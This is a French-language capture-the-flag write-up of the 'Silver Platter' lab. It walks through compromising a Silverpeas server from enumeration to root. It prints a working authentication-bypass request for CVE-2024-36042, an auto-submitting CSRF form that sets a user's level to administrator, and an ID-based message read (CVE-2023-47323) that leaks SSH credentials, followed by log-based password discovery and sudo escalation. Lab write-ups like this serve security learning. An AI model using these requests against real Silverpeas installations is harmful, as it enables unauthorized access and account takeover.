# ROOM : 
Silver Platter !

# Infos
Une petite VM rapide, cela fait longtemps que j'en ai pas fait. Mon nouveau travail me prend énormement de temp ! Elle est plutôt cool mais je trouve que la privesc pour devenir root est bien trop facile.

# Enumeration
Il y a une page web d'une boite de cybersécurité "Hack Smarter Security" qui propose de l'aide pour améliorer la sécurité des organisations.

Dans la page **Contact** on trouve quelques infos :
- On trouve un potentiel identifiant : **scr1ptkiddy**
- Le site utilise visiblement **Silverpeas**.

L'exploit est surement la [CVE-2024-36042](https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d)
Silverpeas est accessible depuis le port 8080.

## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-07 13:31 EST
Nmap scan report for 10.10.198.87
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Fri, 07 Mar 2025 18:31:44 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Fri, 07 Mar 2025 18:31:43 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|_http-title: Error

```
# Exploitation
Je test la **CVE-2024-36042**:

Requête dans Burp Suite : 
```
POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.10.198.87:8080
Content-Length: 38
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.198.87:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.198.87:8080/silverpeas/defaultLogin.jsp?DomainId=-1&ErrorCode=2
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=sa_zxO2nT9V2GAGxkwfNdXaOy8fOWMZmh7vvqsFq.ebabc79c6d2a
Connection: keep-alive

Login=scr1ptkiddy&DomainId=0
```
Elle fonctionne, j'ai accès au dashboard de Silverpeas, avec le compte de **scr1ptkiddy** mais il est simple utilisateur.

J'ai trouver ce [papers](https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/) qui présente plusieurs CVEs concernant Silverpeas, je vais les tests.

On va test la privesc en passant par l'option **Write to administrators**.
Payload : 
```html
<html><body onload="document.forms[0].submit();"><form action="http://10.10.167.108:8080/silverpeas/RjobDomainPeas/jsp/userModify" method="GET"><input type="hidden" name="Iduser" value="1" /><input type="hidden" name="userLastName" value="scr1ptkiddy" /><input type="hidden" name="userAccessLevel" value="ADMINISTRATOR" /><input type="hidden" name="X-STKN" value="OTAyN2FkZTAtZDUzZi00MWVkLTk1MDktNTEwNmNmNTkyOGNk" /></form></body></html>
```
Mais cela ne fonctionne pas car je n'ai pas l'administrateur qui va lire ses messages, on ne peux donc pas exploiter cette CSRF.

On va test une autre CVE qui semble interessante, la CVE [CVE-2023-47323](https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323) qui permet de lire les messages avec les ID, on va peut-être trouver des trucs utile.

Effectivement, le message avec l'ID **6** permet de voir un message de l'administrateur avec des identifiants/mot de passe de **tim** pour une connexion sur le serveur via SSH :
Payload : http://10.10.167.108:8080/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
```
Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes. 
Username: tim
Password: cm0n[REDACTED]lol
```
Le compte fonctionne, me voici sur le serveur :
```
Last login: Wed Dec 13 16:33:12 2023 from 192.168.1.20
tim@silver-platter:~$ 
```
# Post-Exploitation
Nous sommes connecté en SSH sur le serveur et j'ai donc le 1er flag :
```
tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt 
THM{c4c[REDACTED]49b}
```
Je vois qu'il y a un autre utilisateur du nom de **tyler** qui a un /bin/bash
```
tim@silver-platter:~$ cat /etc/passwd | grep "/bin/bash"
root:x:0:0:root:/root:/bin/bash
tyler:x:1000:1000:root:/home/tyler:/bin/bash
tim:x:1001:1001::/home/tim:/bin/bash
```
Mon user actuel n'est pas dans le groupe SUDO:
```
tim@silver-platter:/home$ sudo -l
[sudo] password for tim: 
Sorry, user tim may not run sudo on silver-platter.
```
Je pense que le but ici est d'avoir le compte de **tyler** et ensuite **root**.

Je sais que **tim** fait parti du group **adm**. Être dans ce groupe permet de lire les logs sans avoir de privilèges **root**.
```
tim@silver-platter:/tmp$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```
Dans **/var/log/auth.log.2** on retrouve un mot de passe:
```
Dec 13 15:45:57 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=[REDACTED] -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
```
Il s'agit du mot de passe de **tyler**
```
tim@silver-platter:/tmp$ su tyler
Password: 
tyler@silver-platter:/tmp$ 
```
## Prives to Root :)
Easy. Tyle est dans le groupe sudo avec **(ALL : ALL) ALL**, cela signifie que l'utilisateur **tyler** peut exécuter toutes les commandes en tant que n'importe quel utilisateur et n'importe quel groupe, avec sudo.
En gros, cet utilisateur a un accès total via sudo, comme s'il était root.
```
tyler@silver-platter:~$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
tyler@silver-platter:~$
```
Avec **sudo su** on devient donc **root**
```
tyler@silver-platter:~$ sudo su
root@silver-platter:/home/tyler# 
```
```
root@silver-platter:/home/tyler# cat /root/root.txt 
THM{098[REDACTED]f6}
```
